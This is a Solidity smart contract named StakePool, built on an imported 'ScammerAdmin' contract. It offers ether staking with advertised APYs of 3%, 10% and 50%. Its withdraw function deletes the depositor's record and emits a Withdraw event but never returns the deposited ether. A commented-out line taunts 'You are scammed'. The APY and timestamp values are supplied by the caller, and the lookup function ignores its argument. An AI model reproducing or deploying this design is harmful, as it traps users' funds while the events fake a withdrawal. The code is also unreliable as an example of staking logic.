// SPDX-License-Identifier: MIT
pragma solidity >=0.8.17 <0.9.0;

import "./ScammerAdmin.sol";

contract StakePool is ScammerAdmin {
    struct Staker {
        uint256 balance; // wei, total deposit
        uint256 depositTimestamp;
        uint256 apy; // percent
        uint256 apyTerm; // months
    }
    enum PoolStatus {
        LOCK,
        OPEN
    }
    uint256 public constant DAY_TIMESTAMP = 60 * 60 * 24;

    // state variables
    PoolStatus pStatus = PoolStatus.OPEN;
    mapping(address => Staker) public stakers;

    event Withdraw(
        address indexed _staker,
        uint256 _balance,
        uint256 _depositTimestamp,
        uint256 _apy,
        uint256 _apyTerm,
        uint256 _reward
    );
    event Deposit(
        address indexed _staker,
        uint256 _balance,
        uint256 _depositTimestamp,
        uint256 _apy,
        uint256 _apyTerm
    );

    function getReward(uint256 timestamp) public view returns (uint256) {
        // uint256 duration = now - timestamp;
        uint256 timestampDiff = block.timestamp - timestamp;
        uint256 daysDiff = timestampDiff / DAY_TIMESTAMP;
        return daysDiff;
    }

    // stake1, 3, 9 tháng
    // stake1 là 3%, stake3 là 10%, stake 9 là 50% nh
    function deposit(
        uint256 depositTimestamp,
        uint256 apy,
        uint256 apyTerm
    ) public payable {
        // require(stakers[msg.sender].value === 0, "You already deposit");

        // string memory _balance = uint2str(msg.value);
        // stakers[msg.sender] = Staker("2.3", 1668928830000, 10, 3);
        stakers[msg.sender] = Staker(msg.value, depositTimestamp, apy, apyTerm);
        // address payable contractPayable = payable(address(this));
        // contractPayable.transfer(msg.value);

        emit Deposit(msg.sender, msg.value, depositTimestamp, apy, apyTerm);
    }

    function withdraw(uint256 timestamp) public payable {
        Staker memory staker = stakers[msg.sender];
        uint256 reward = getReward(timestamp);

        // require(address(this).balance < reward, "You are scammed, leu leu");

        delete stakers[msg.sender];

        emit Withdraw(
            msg.sender,
            msg.value,
            staker.depositTimestamp,
            staker.apy,
            staker.apyTerm,
            reward
        );
    }

    function setPoolStatus(uint256 _status) public onlyAdmin {
        if (_status == uint256(PoolStatus.LOCK)) {
            pStatus = PoolStatus.LOCK;
        } else if (_status == uint256(PoolStatus.OPEN)) {
            pStatus = PoolStatus.OPEN;
        }
    }

    function getPoolInfo()
        public
        view
        onlyAdmin
        returns (address _admin, uint256 _pStatus)
    {
        return (admin, uint256(pStatus));
    }

    function getStakerInfo(address _staker)
        public
        view
        returns (Staker memory)
    {
        _staker = msg.sender;
        return stakers[_staker];
    }

    //  function setUser(uint _idUser) public {
    //     users[_idUser]._user_id = 0;
    //     users[_idUser]._name = 0x7465737400000000000000000000000000000000000000000000000000000000;
    //     users[_idUser]._address = 0x5B38Da6a701c568545dCfcB03FcB870000000000000000000000000000000000;
    //     users[_idUser]._birth_day = 0xf711600000000000000000000000000000000000000000000000000000000000;
    // }

    // function uint2str(uint256 _i)
    //     internal
    //     pure
    //     returns (string memory _uintAsString)
    // {
    //     if (_i == 0) {
    //         return "0";
    //     }
    //     uint256 j = _i;
    //     uint256 len;
    //     while (j != 0) {
    //         len++;
    //         j /= 10;
    //     }
    //     bytes memory bstr = new bytes(len);
    //     uint256 k = len - 1;
    //     while (_i != 0) {
    //         bstr[k--] = bytes1(uint8(48 + (_i % 10)));
    //         _i /= 10;
    //     }
    //     return string(bstr);
    // }
}
